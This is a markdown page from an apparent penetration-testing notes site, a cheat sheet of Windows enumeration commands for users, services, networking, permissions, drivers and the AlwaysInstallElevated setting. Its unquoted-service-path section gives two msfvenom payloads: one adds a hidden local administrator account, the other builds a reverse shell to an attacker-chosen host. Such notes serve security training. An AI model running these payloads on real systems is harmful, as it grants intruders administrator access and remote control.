---
layout: default
title: Windows
parent: Enumeration
has_children: false
nav_order: 2
---

# Windows
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Automated Enumeration

### winPEAS

### Windows Exploit Suggester

## Manual Enumeration

### Enumerating Users

When run without parameters, whoami will display the username the shell is running as. On Windows, we can pass the discovered username as an argument to the net user command to gather more information. 
 
```
whoami
```

To discover other accounts on the system we can use the 'net user' command on Windows based systems.

```
net user
```

Using the username obtained from 'whoami' as an argument to the command 'net user'
 
```
net user <name>
```

We can discover the hostname with the aptly-named hostname command, which is typically installed on both Windows and Linux.

A machine’s hostname can often provide clues about its functional roles. More often than not, the hostnames will include identifiable abbreviations such as web for a web server, db for a database server, dc for a domain controller, etc.

```
hostname
```

### Operating System Version and Architecture 

On the Windows operating system, we can gather specific operating system and architecture information with the systeminfo utility. 

We can also use findstr along with a few useful flags to filter the output. Specifically, we can match patterns at the beginning of a line with /B and specify a particular search string with /C:

```
systeminfo
```

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### Running Processes and Service

List the running processes on Windows with the tasklist command. The /SVC flag will return processes that are mapped to a specific Windows service. 

```
tasklist /SVC
```

### Identify vulnerable unquoted service path executables

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

Got a result? quick priv esc if you have permissions to restart box:
```
msfvenom -a x86 -p windows/exec CMD="cmd.exe /c net user r00ted rooted /add && net localgroup Administrators r00ted /add" -f exe -o ServiceNameHere.exe
```

or

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP ADDRESS> LPORT=<PORT> -f exe > reverse.exe 
```

### Running services

```
wmic service get name,displayname,pathname,startmode
```

### Running services that are started automatically

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto
```

### Running services that are started automatically and contains the string "windows"

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
```

### Networking Information

```
ipconfig /all
```

To display the networking routing tables, use the route command followed by the print argument. 

```
route print
``` 

Use netstat to view the active network connections. Specifying the `a` flag will display all active TCP connections, the `n` flag allows us to display the address and port number in a numerical form, and the `o` flag will display the owner PID of each connection. Netstat provides us with a list of all the listening ports on the machine, it also included information about established connections that could reveal other users connected to this machine that we may want to target later. 

```
netstat -ano
```

### Firewall Status and Rules

Inspect the current firewall profile using the netsh command. 

```
netsh advfirewall show currentprofile
```

If the current firewall state is 'ON' then we can take a closer look at the rules.

```
netsh advfirewall firewall show rule name=all
```

### Scheduled Tasks

We can create and view scheduled tasks on Windows with the schtasks command. The `/query` argument displays tasks and `/fo LIST` sets the output format to a simple list. We can also use `/v` to request verbose output.

```
schtasks /query /fo LIST /v
```

### Installed Applications and Patch Levels

Enumerating Installed Applications and Patch Level,  It will not list applications that do not use the Windows Installer.

```
wmic product get name, version, vendor
```

`wmic` can also be used to list system-wide updates by querying the Win32_QuickFixEngineering (qfe)472 WMI class

```
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

### Readable/Writable Files and Directories

Use AccessChk to find a file with insecure file permissions in the Program Files directory. Use `-u` to suppress errors, `-w` to search for write access permissions, and `-s` to perform a recursive search. The additional options are also worth exploring as this tool is quite useful.

```
accesschk.exe -uws "Everyone" "C:\Program Files"
```

We can also accomplish the same goal using PowerShell. This is useful in situations where we may not be able to transfer and execute arbitrary binary files on our target system.

The primary cmdlet we are using is `Get-Acl`, which retrieves all permissions for a given file or directory. 

However, since `Get-Acl` cannot be run recursively, we are also using the `Get-ChildItem` cmdlet to first enumerate everything under the Program Files directory. This will effectively retrieve every single object in our target directory along with all associated access permissions. The AccessToString property with the `-match` flag narrows down the results to the specific access properties we are looking for. In our case, we are searching for any object can be modified (Modify) by members of the Everyone group. 
 
```
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

### Unmounted Disks

On Windows-based systems, we can use `mountvol` to list all drives that are currently mounted as well as those that are physically connected but unmounted.

```
mountvol
```

### Device Drivers and Kernel Modules

Enumerating Device Drivers and Kernel Modules. We can begin our search with the driverquery command. We’ll supply the /v argument for verbose output as well as /fo csv to request the output in CSV format.
 
```
powershell
```
```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```  

Use the Get-WmiObject cmdlet to get the Win32_PnPSignedDriver WMI instance, which provides digital signature information about drivers.

```
powershell
```
```
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"} 
```

### Third Party Drivers

Enumerate the drivers that are installed on the system
 
```
driverquery /v
``` 

### Binaries That AutoElevate

On Windows systems, we should check the status of the AlwaysInstallElevated registry setting. If this key is enabled (set to 1) in either `HKEY_CURRENT_USER` or `HKEY_LOCAL_MACHINE`, any user can run Windows Installer packages with elevated privileges. If this setting is enabled, we could craft an MSI file and run it to elevate our privileges.

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

```
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer 
```










